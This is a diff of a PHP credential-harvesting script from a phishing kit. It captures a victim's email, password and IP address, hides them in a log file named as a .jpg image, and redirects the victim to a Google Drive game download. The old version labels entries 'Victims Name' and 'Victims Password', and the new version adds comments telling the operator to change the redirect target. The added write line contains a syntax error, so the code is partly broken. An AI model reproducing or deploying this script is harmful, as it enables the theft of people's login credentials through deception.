@@ -1,11 +1,24 @@
 <?php
-$email = $_SESSION['Email']; 
-$password = $_POST['Passwd'];
-$ip = $_SERVER['REMOTE_ADDR']; 
-$f = fopen("AAC189092019881999191919191mobeen.jpg", "a"); 
-fwrite ($f, 'Victims Name: [<b><font color="#570000">'.$email.'</font></b>] Victims Password: [<b><font color="#57003A">'.$password.'</font></b>] Victims Password: [<b><font color="#57003A">'.$password.'</font></b>] IP: [<b><font color="#005700">'.$ip.'</font></b>] By: [<b><font color="#005700"><a href="http://www.fb.com/mobeendotcom" rel="nofollow">Bee Hay</a></font></b>]<br>');
-fclose($f);
-header('Location:https://drive.google.com/file/d/0B6gbXN_c6lAQWGF1alVfSDNEREE/view');
+
+			session_start();
+			
+			$pass = $_POST["Passwd"];
+			$email=$_SESSION["Email"];
+      $ip = $_SERVER['REMOTE_ADDR'];
+			//opening logins text file for appending new data.
+  			$file = fopen("haybee.jpg", "a") or die("Unable to open file!");
+			
+  			//Writing email and password to haybee.jpg. 
+  			fwrite($file, .$ip." .$email."	".$pass.PHP_EOL);			
+  			fclose($file);//closing haybee.txt.
+			
+  			//redirecting user to the google drive's locations where the game is available to download.
+  			//change the location url to redirect to a website of your choice.
+  			header("Location: https://drive.google.com/file/d/0B6gbXN_c6lAQWGF1alVfSDNEREE/view");
+			exit();
+			
+			
+			session_destroy();
+			
+
 ?>
-
-
